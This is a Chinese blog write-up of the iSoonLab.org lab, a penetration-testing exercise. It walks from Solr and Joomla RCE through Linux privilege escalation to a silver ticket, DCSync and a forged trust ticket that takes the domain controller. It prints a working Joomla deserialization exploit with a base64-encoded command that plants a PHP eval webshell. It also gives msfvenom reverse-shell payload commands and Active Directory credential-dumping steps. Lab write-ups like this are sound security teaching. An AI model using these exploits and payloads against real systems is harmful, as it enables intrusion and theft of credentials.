@@ -1,0 +1,140 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>iSoonLab.org Write-up | Patrilic's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">iSoonLab.org Write-up</h1><a id="logo" href="/.">Patrilic's blog</a><p class="description">不忘初心</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/2019/04/01/Hello/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">iSoonLab.org Write-up</h1><div class="post-meta">Dec 12, 2019<span> | </span><span class="category"><a href="/categories/Write-up/">Write-up</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><a class="disqus-comment-count" data-disqus-identifier="2019/12/12/iSoonLab.org Write-up/" href="/2019/12/12/iSoonLab.org Write-up/#disqus_thread"></a><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目拓扑"><span class="toc-number">1.</span> <span class="toc-text">题目拓扑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux1"><span class="toc-number">2.</span> <span class="toc-text">Linux1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux2"><span class="toc-number">3.</span> <span class="toc-text">Linux2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Backup-sub-iSoonLab-org"><span class="toc-number">4.</span> <span class="toc-text">Backup.sub.iSoonLab.org</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#subdc-iSoonLab-org"><span class="toc-number">5.</span> <span class="toc-text">subdc.iSoonLab.org</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DC-iSoonLab-org"><span class="toc-number">6.</span> <span class="toc-text">DC.iSoonLab.org</span></a></li></ol></div></div><div class="post-content"><blockquote>
+<p>@Author: Patrilic<br>@Time: 2019-12-12 14:32:22<br><img src="/wallpaper/[30125]16347313.jpg" alt></p>
+</blockquote>
+<h2 id="题目拓扑"><a href="#题目拓扑" class="headerlink" title="题目拓扑"></a>题目拓扑</h2><p>Linux1 - solr: 192.168.21.12</p>
+<p>Linux2 - joomla!: 192.168.21.20</p>
+<p>Backup.sub.iSoonLab.org: 192.168.21.8</p>
+<p>subdc.sub.iSoonLab.org: 192.168.21.4  /  10.153.69.50</p>
+<p>DC.iSoonLab.org: 10.153.69.5</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201130447779.png" alt="image-20191201130447779"></p>
+<h2 id="Linux1"><a href="#Linux1" class="headerlink" title="Linux1"></a>Linux1</h2><p>目标:192.168.121.131</p>
+<p><img src="/iSoonLab.org Write-up/image-20191130235112082.png" alt="image-20191130235112082"></p>
+<p>开放8983端口，打开是solr未授权，8.1.1版本，联想到前段时间很火的Apache Solr RCE</p>
+<p><a href="https://www.freebuf.com/vuls/218730.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218730.html</a>    </p>
+<p>根据网上的exp</p>
+<p><a href="http://192.168.121.131:8983/solr/admin/cores?wt=json&amp;indexInfo=false" target="_blank" rel="noopener">http://192.168.121.131:8983/solr/admin/cores?wt=json&amp;indexInfo=false</a></p>
+<p><img src="/iSoonLab.org Write-up/image-20191130235337378.png" alt="image-20191130235337378"></p>
+<p>存在iSoon core</p>
+<p><img src="/iSoonLab.org Write-up/image-20191130235734297.png" alt="image-20191130235734297"></p>
+<p><img src="/iSoonLab.org Write-up/image-20191130235823000.png" alt="image-20191130235823000"></p>
+<p>确实没问题，弹个shell到本机来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IP_Addr&gt; LPORT=&lt;Port_Num&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+<p>因为solr用户没有/tmp目录写权限， 可以参考@haya大手子的<a href="https://forum.90sec.com/t/topic/579" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/579</a></p>
+<p>用perl来执行脚本</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201002127259.png" alt="image-20191201002127259"></p>
+<p>flag就在当前目录</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201002513741.png" alt="image-20191201002513741"></p>
+<p>当然，也可以在/var/tmp里写文件～</p>
+<h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>简单侦查后，发现存在192.168.21.0/24网段</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201002640156.png" alt="image-20191201002640156"></p>
+<p>使用msf自带的sock4a作代理即可，Linux1只是用来撕来流量口子</p>
+<p>代理内网后，发现同网段存在三台机器</p>
+<p>找到Linux2 : 192.168.21.20， 开放HTTP端口</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201003644193.png" alt="image-20191201003644193"></p>
+<p>joomla-3.4.6版本，存在RCE，通过构造exp，拿到webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSimplepieFactory</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysql</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysqli</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $xx;</span><br><span class="line">    <span class="keyword">protected</span> $connection;</span><br><span class="line">    <span class="keyword">protected</span> $disconnectHandlers;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;xx = <span class="keyword">new</span> JSimplepieFactory();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="number">1</span>;</span><br><span class="line">        $obj = <span class="keyword">new</span> SimplePie;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;disconnectHandlers = [</span><br><span class="line">            [$obj, <span class="string">"init"</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $sanitize;</span><br><span class="line">    <span class="keyword">var</span> $cache_name_function;</span><br><span class="line">    <span class="keyword">var</span> $feed_url;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;feed_url = <span class="string">"system('echo \'ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUW2FdKT8+IiA+IC9ob21lL3d3d3Jvb3QvZGVmYXVsdC8xLnBocA==\'| base64 -d | bash');JFactory::getConfig();exit;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache_name_function = <span class="string">"assert"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sanitize = <span class="keyword">new</span> JDatabaseDriverMysql();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> JDatabaseDriverMysqli();</span><br><span class="line">$ser = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $data = str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $ser);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用户名：</span><br><span class="line">\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span></span><br><span class="line"></span><br><span class="line">密码：</span><br><span class="line">MYP<span class="string">";s:2:"</span>HS<span class="string">";O:21:"</span>JDatabaseDriverMysqli<span class="string">":4:&#123;s:5:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>xx<span class="string">";O:17:"</span>JSimplepieFactory<span class="string">":0:&#123;&#125;s:13:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>connection<span class="string">";i:1;s:21:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>disconnectHandlers<span class="string">";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"</span>SimplePie<span class="string">":3:&#123;s:8:"</span>sanitize<span class="string">";O:20:"</span>JDatabaseDriverMysql<span class="string">":0:&#123;&#125;s:19:"</span>cache_name_function<span class="string">";s:6:"</span>assert<span class="string">";s:8:"</span>feed_url<span class="string">";s:149:"</span>system(<span class="string">'echo \'ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUW2FdKT8+IiA+IC9ob21lL3d3d3Jvb3QvZGVmYXVsdC8xLnBocA==\'| base64 -d | bash'</span>);JFactory::getConfig();<span class="keyword">exit</span>;<span class="string">";&#125;i:1;s:4:"</span>init<span class="string">";&#125;&#125;s:6:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>obj<span class="string">";N;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>antsword连接后，在/tmp目录上传我们生成的msf木马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.21.12 LPORT=6666 -f elf &gt; shell2.elf</span><br></pre></td></tr></table></figure>
+<p><img src="/iSoonLab.org Write-up/image-20191201004320825.png" alt="image-20191201004320825"></p>
+<p>拿到shell后，查看uname</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201004824374.png" alt="image-20191201004824374"></p>
+<p>内核版本比较低的桌面版本，存在CVE-2019-13272</p>
+<p>EXP需要满足三个条件: </p>
+<ol>
+<li>内核版本 &lt; 5.1.17 且为桌面版</li>
+<li>存在/home/\<user></user></li>
+<li>交互式shell</li>
+</ol>
+<p><img src="/iSoonLab.org Write-up/image-20191201005023629.png" alt="image-20191201005023629"></p>
+<p>成功拿到第二个flag</p>
+<h2 id="Backup-sub-iSoonLab-org"><a href="#Backup-sub-iSoonLab-org" class="headerlink" title="Backup.sub.iSoonLab.org"></a>Backup.sub.iSoonLab.org</h2><p>回过来看web界面的提示</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201005203360.png" alt="image-20191201005203360"></p>
+<p>放出了下一步的hint，查看已经安装的软件和python第三方库</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201005355412.png" alt="image-20191201005355412"></p>
+<p>三条思路：</p>
+<ol>
+<li><p>利用impacket和arpspoof进行中间人攻击</p>
+</li>
+<li><p>在本机上进行信息搜集，寻找到域成员机器的路子</p>
+</li>
+<li>系统漏洞 -&gt; ms17010 .etc </li>
+</ol>
+<ol>
+<li><p>中间人攻击使用ms15-014 和 ms15-011 进行组策略劫持，拿下域成员机器</p>
+</li>
+<li><p>翻机器的日志</p>
+</li>
+<li>有day上day～ </li>
+</ol>
+<p>### </p>
+<p>简单方法:</p>
+<p>通过<code>.bash_history</code>拿到mount命令，存有明文密码， 通过<code>exploit/windows/smb/psexec</code>即可拿到目标机器NT/SYSTEM</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201013130568.png" alt="image-20191201013130568"></p>
+<p>中间人测试也是可行的，使用MS15-011劫持组策略，只是需要等待组策略生效 (默认90分钟)</p>
+<p>&lt;懒狗不想截图了&gt;</p>
+<h2 id="subdc-iSoonLab-org"><a href="#subdc-iSoonLab-org" class="headerlink" title="subdc.iSoonLab.org"></a>subdc.iSoonLab.org</h2><p>在backup机子上的C:\Backup翻到了注册表的存档</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201014315000.png" alt="image-20191201014315000"></p>
+<p>下载下来使用secretsdump进行dump</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201014547133.png" alt="image-20191201014547133"></p>
+<p>拿到服务账户后，用来构造白银票据，攻击subdc.sub.iSoonLab.org<br>（MS14068也可）</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201015913467.png" alt="image-20191201015913467"></p>
+<p>(注意必须关闭Linux2中的arpspoof)</p>
+<p><img src="/iSoonLab.org Write-up/image-20191201020209077.png" alt="image-20191201020209077"></p>
+<p>第四个flag到手～～</p>
+<h2 id="DC-iSoonLab-org"><a href="#DC-iSoonLab-org" class="headerlink" title="DC.iSoonLab.org"></a>DC.iSoonLab.org</h2><p>最后就很简单啦，子父域中常见的双向信任，我们可以通过构造信任票据来进行攻击</p>
+<p>利用信任票据 </p>
+<p><a href="http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/</a> </p>
+<p>这里有一点小问题: 当指定krbtgt账户时，因为子父域中存在两个krbtgt账户，DCsync转储时可能爆<code>NOT_UNIQUE</code>，可以使用/all解决 </p>
+<p>利用dcsync 转储子域的所有hash </p>
+<p><img src="/iSoonLab.org Write-up/4624EF12-0825-4134-BFFE-AF47CF9CA4FB.png" alt="4624EF12-0825-4134-BFFE-AF47CF9CA4FB"></p>
+<p><img src="/iSoonLab.org Write-up/04C766D7-B915-48FE-A381-3CA4DD18727D.png" alt="04C766D7-B915-48FE-A381-3CA4DD18727D"></p>
+<p>使用/Ptt 进行信任票据传递即可</p>
+<p><img src="/iSoonLab.org Write-up/2A7C786C-5AA4-4AE2-8DE1-755DBFDE9382.png" alt="2A7C786C-5AA4-4AE2-8DE1-755DBFDE9382"></p>
+<p>拿到域控权限，flag在C:\Users\Administraotr\flag.txt中</p>
+</div><div class="tags"><a href="/tags/iSoonLab-org/">iSoonLab.org</a></div><div class="post-nav"><a class="pre" href="/2099/12/31/Tomorrow/">Tomorrow</a><a class="next" href="/2019/10/09/Bypass CDN 寻找真实IP_1/">Bypass CDN 寻找真实IP</a></div><div id="disqus_thread"><div class="btn_click_load"><button class="disqus_click_btn">阅读评论（请确保 Disqus 可以正常加载）</button></div><script type="text/javascript">var disqus_config = function () {
+    this.page.url = 'http://patrilic.top/2019/12/12/iSoonLab.org Write-up/';
+    this.page.identifier = '2019/12/12/iSoonLab.org Write-up/';
+    this.page.title = 'iSoonLab.org Write-up';
+  };</script><script type="text/javascript" id="disqus-lazy-load-script">$.ajax({
+url: 'https://disqus.com/next/config.json',
+timeout: 2500,
+type: 'GET',
+success: function(){
+  var d = document;
+  var s = d.createElement('script');
+  s.src = '//Patrilic.disqus.com/embed.js';
+  s.setAttribute('data-timestamp', + new Date());
+  (d.head || d.body).appendChild(s);
+  $('.disqus_click_btn').css('display', 'none');
+},
+error: function() {
+  $('.disqus_click_btn').css('display', 'block');
+}
+});</script><script type="text/javascript" id="disqus-click-load">$('.btn_click_load').click(() => {  //click to load comments
+    (() => { // DON'T EDIT BELOW THIS LINE
+        var d = document;
+        var s = d.createElement('script');
+        s.src = '//Patrilic.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', + new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    $('.disqus_click_btn').css('display','none');
+});</script><script type="text/javascript" id="disqus-count-script">$(function() {
+     var xhr = new XMLHttpRequest();
+     xhr.open('GET', '//disqus.com/next/config.json', true);
+     xhr.timeout = 2500;
+     xhr.onreadystatechange = function () {
+       if (xhr.readyState === 4 && xhr.status === 200) {
+         $('.post-meta .post-comments-count').show();
+         var s = document.createElement('script');
+         s.id = 'dsq-count-scr';
+         s.src = 'https://Patrilic.disqus.com/count.js';
+         s.async = true;
+         (document.head || document.body).appendChild(s);
+       }
+     };
+     xhr.ontimeout = function () { xhr.abort(); };
+     xhr.send(null);
+   });
+</script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://patrilic.top"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ATT-CK/">ATT&CK</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/BypassUac/">BypassUac</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Diary/">Diary</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pentest-Cheat-Sheet/">Pentest Cheat Sheet</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Red-Team-Tricks/">Red-Team Tricks</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQLi-Tricks/">SQLi Tricks</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Skills/">Skills</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Threat-Intelligence/">Threat Intelligence</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Write-up/">Write-up</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞复现/">漏洞复现</a><span class="category-list-count">8</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/metasploit/" style="font-size: 15px;">metasploit</a> <a href="/tags/Backdoor/" style="font-size: 15px;">Backdoor</a> <a href="/tags/Bypass-CDN/" style="font-size: 15px;">Bypass CDN</a> <a href="/tags/BlueKeep/" style="font-size: 15px;">BlueKeep</a> <a href="/tags/Windows提权/" style="font-size: 15px;">Windows提权</a> <a href="/tags/Forcepoint-VPN/" style="font-size: 15px;">Forcepoint VPN</a> <a href="/tags/DLL-Hijacking/" style="font-size: 15px;">DLL Hijacking</a> <a href="/tags/代码审计/" style="font-size: 15px;">代码审计</a> <a href="/tags/n1ctf-pentest/" style="font-size: 15px;">n1ctf-pentest</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/内网渗透/" style="font-size: 15px;">内网渗透</a> <a href="/tags/proc/" style="font-size: 15px;">proc</a> <a href="/tags/SQL注入/" style="font-size: 15px;">SQL注入</a> <a href="/tags/Struts2/" style="font-size: 15px;">Struts2</a> <a href="/tags/文件上传/" style="font-size: 15px;">文件上传</a> <a href="/tags/Git/" style="font-size: 15px;">Git</a> <a href="/tags/威胁情报/" style="font-size: 15px;">威胁情报</a> <a href="/tags/命令执行/" style="font-size: 15px;">命令执行</a> <a href="/tags/iSoonLab-org/" style="font-size: 15px;">iSoonLab.org</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://balis0ng.com" title="balis0ng" target="_blank">balis0ng</a><ul></ul><a href="https://evi1cg.me/" title="evi1cg's Blog" target="_blank">evi1cg's Blog</a><ul></ul><a href="http://hpdoger.cn" title="Hpdoger" target="_blank">Hpdoger</a><ul></ul><a href="http://0day.design" title="Passer6y" target="_blank">Passer6y</a><ul></ul><a href="http://adm1n.design" title="Hu3sky" target="_blank">Hu3sky</a><ul></ul><a href="http://0xa1paca.top" title="0xa1paca" target="_blank">0xa1paca</a><ul></ul><a href="http://noel.xin/" title="Noel's Blog" target="_blank">Noel's Blog</a><ul></ul><a href="https://www.0akarma.com" title="0aKarmA" target="_blank">0aKarmA</a><ul></ul><a href="https://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a><ul></ul><a href="https://www.kingkk.com/" title="Kingkk's Blog" target="_blank">Kingkk's Blog</a><ul></ul><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a><ul></ul><a href="http://r3start.net/" title="R3start" target="_blank">R3start</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">Patrilic's blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"tagMode":false});</script></body></html>
